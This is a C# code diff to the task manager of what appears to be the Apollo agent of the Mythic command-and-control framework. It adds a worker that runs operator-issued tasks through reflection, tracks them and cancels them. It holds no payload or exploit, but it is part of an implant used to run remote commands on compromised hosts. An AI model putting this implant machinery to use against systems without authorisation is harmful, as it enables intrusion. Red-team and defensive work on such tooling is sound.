@@ -7,12 +7,19 @@ using ApolloInterop.Interfaces;
 using ApolloInterop.Types.Delegates;
 using ApolloInterop.Structs.MythicStructs;
 using ApolloInterop.Enums.ApolloEnums;
+using ApolloInterop.Classes;
+using System.Threading;
+using ThreadingTask = System.Threading.Tasks.Task;
 
 namespace Apollo.Management.Tasks
 {
+    internal struct TaskInformation {
+        Task Task;
+        CancellationToken Token;
+    }
     public class TaskManager : ITaskManager
     {
-        protected IAgent Agent;
+        protected IAgent _agent;
 
 
         private ConcurrentQueue<TaskResponse> TaskResponseQueue = new ConcurrentQueue<TaskResponse>();
@@ -25,17 +32,83 @@ namespace Apollo.Management.Tasks
             { MessageDirection.FromMythic, new ConcurrentQueue<SocksDatagram>() }
         };
 
+        private ConcurrentDictionary<string, Tasking> _runningTasks = new ConcurrentDictionary<string, Tasking>();
 
         private ConcurrentQueue<Task> TaskQueue = new ConcurrentQueue<Task>();
         private ConcurrentQueue<TaskStatus> TaskStatusQueue = new ConcurrentQueue<TaskStatus>();
-
-
+        private Action _taskConsumerAction;
+        private ThreadingTask _mainworker;
         public TaskManager(IAgent agent)
         {
-            Agent = agent;
+            _agent = agent;
+            _taskConsumerAction = () =>
+            {
+                while(_agent.IsAlive())
+                {
+                    if (TaskQueue.TryDequeue(out Task result))
+                    {
+                        Type taskType = Type.GetType($"Tasking.{result.Command}");
+                        if (taskType == null)
+                        {
+                            AddTaskResponseToQueue(new TaskResponse()
+                            {
+                                UserOutput = $"Task '{result.Command}' not loaded.",
+                                TaskID = result.ID,
+                                Completed = true,
+                                Status = "error"
+                            });
+                        } else
+                        {
+                            Tasking t = (Tasking)Activator.CreateInstance(taskType, new object[] { _agent, result });
+                            var taskObj = t.CreateTasking();
+                            // When the task finishes, we remove it from the queue.
+                            taskObj.ContinueWith((_) =>
+                            {
+                                _runningTasks.TryRemove(t.ID(), out Tasking _);
+                            });
+                            // Unhandled exception occurred in task, report it.
+                            taskObj.ContinueWith((_) =>
+                            {
+                                OnTaskErrorOrCancel(t, taskObj);
+                            }, System.Threading.Tasks.TaskContinuationOptions.OnlyOnFaulted);
+                            // If it got cancelled and threw an exception of that type,
+                            // report it.
+                            taskObj.ContinueWith((_) =>
+                            {
+                                OnTaskErrorOrCancel(t, taskObj);
+                            }, System.Threading.Tasks.TaskContinuationOptions.OnlyOnCanceled);
+                            _runningTasks.TryAdd(t.ID(), t);
+                            taskObj.Start();
+                        }
+
+                    }
+                }
+            };
+            _mainworker = new ThreadingTask(_taskConsumerAction);
+            _mainworker.Start();
         }
 
-        
+        private void OnTaskErrorOrCancel(Tasking t, System.Threading.Tasks.Task taskObj)
+        {
+            string aggregateError = "";
+            if (taskObj.Exception != null)
+            {
+                foreach (Exception e in taskObj.Exception.InnerExceptions)
+                {
+                    aggregateError += $"Unhandled exception: {e}\n\n";
+                }
+            } else if (taskObj.IsCanceled)
+            {
+                aggregateError = "Task cancelled.";
+            }
+            else
+            {
+                aggregateError = "Unhandled and unknown error occured.";
+            }
+            var msg = t.CreateTaskResponse(aggregateError, true, "error");
+            AddTaskResponseToQueue(msg);
+        }
+
         public void AddTaskResponseToQueue(TaskResponse message)
         {
             TaskResponseQueue.Enqueue(message);
@@ -66,7 +139,7 @@ namespace Apollo.Management.Tasks
 
             foreach(DelegateMessage d in resp.Delegates)
             {
-                Agent.GetPeerManager().Route(d);
+                _agent.GetPeerManager().Route(d);
             }
             return true;
         }
@@ -104,6 +177,24 @@ namespace Apollo.Management.Tasks
                 Socks = dgs.ToArray()
             };
             return onResponse(msg);
+        }
+
+        public bool CancelTask(string taskId)
+        {
+            if (_runningTasks.TryGetValue(taskId, out Tasking t))
+            {
+                try
+                {
+                    t.Kill();
+                    return true;
+                } catch
+                {
+                    return false;
+                }
+            } else
+            {
+                return false;
+            }
         }
     }
 }
